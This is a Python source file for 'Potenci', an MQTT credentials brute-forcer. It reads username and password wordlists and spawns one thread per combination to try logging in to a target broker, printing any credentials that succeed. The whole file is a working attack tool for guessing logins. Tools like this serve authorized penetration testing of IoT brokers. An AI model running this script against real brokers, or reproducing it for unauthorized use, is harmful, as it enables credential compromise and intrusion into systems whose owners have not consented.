import paho.mqtt.client as mqtt
import argparse
import threading
import os

# Project Name: Potenci -from the latin word potentialis: force, power
# MQTT Credentials Bruteforcer
# Owned by @souravbaghz
# https://github.com/souravbaghz
# https://twitter.com/souravbaghz
#
# Usage: python3 potenci.py 127.0.0.1 -u users.txt -P pwd.txt
#        python3 potenci.py mqtt.broker.xyz -u users.txt -P pwd.txt

#BannerStart
print("")
print("\33[37m           ▄█▀ ▄▄▄▄▄▄▄ ▀█▄")
print("           ▀█████████████▀")
print("               █▄███▄█")
print("                █████")
print("                █▀█▀█\33[0m")
print("")
print("\033[32m      █▀█ █▀█ ▀█▀ █▀▀ █▄░█ █▀▀ █")
print("      █▀▀ █▄█ ░█░ ██▄ █░▀█ █▄▄ █\033[0m")
print("     MQTT Credentials Bruteforcer")
print("         \033[01m\033[42mOwned by @souravbaghz\033[0m")
print("    \033[04mgithub.com/souravbaghz/potenci\033[0m")
#print("---------------------------------------------------")
print("")
#BannerEnd

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("\033[92m[SUCCESS] Cred Found: {}:{}".format(userdata[0], userdata[1]))
        client.disconnect()

def login(host, port, username, password):
    try:
        print("\033[94m[INFO] Attempting: {}:{}\033[0m".format(username, password))
        client = mqtt.Client()
        client.username_pw_set(username, password)
        client.user_data_set((username, password))
        client.on_connect = on_connect
        client.connect(host, port, 60)
        client.loop_start()
    except Exception as e:
        print("\033[91m[ERROR] Exception occurred during authentication attempt: {}\033[0m".format(e))

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str, help="Host/IP of the MQTT broker")
parser.add_argument("-p", "--port", type=int, default=1883, help="Port of the MQTT broker (default: 1883)")
parser.add_argument("-u", "--username_file", type=str, help="Text file containing a list of usernames for the MQTT broker")
parser.add_argument("-P", "--password_file", type=str, help="Text file containing a list of passwords for the MQTT broker")

args = parser.parse_args()


if args.username_file and args.password_file:
    if not os.path.exists(args.username_file) or not os.path.exists(args.password_file):
        print("\033[91m[ERROR] Given username or password file does not exist in the directory.\033[0m")
        exit()
    else:
        with open(args.username_file) as f:
            usernames = f.read().splitlines()
        with open(args.password_file) as f:
            passwords = f.read().splitlines()
        for username in usernames:
            for password in passwords:
                thread = threading.Thread(target=login, args=(args.host, args.port, username, password))
                thread.start()
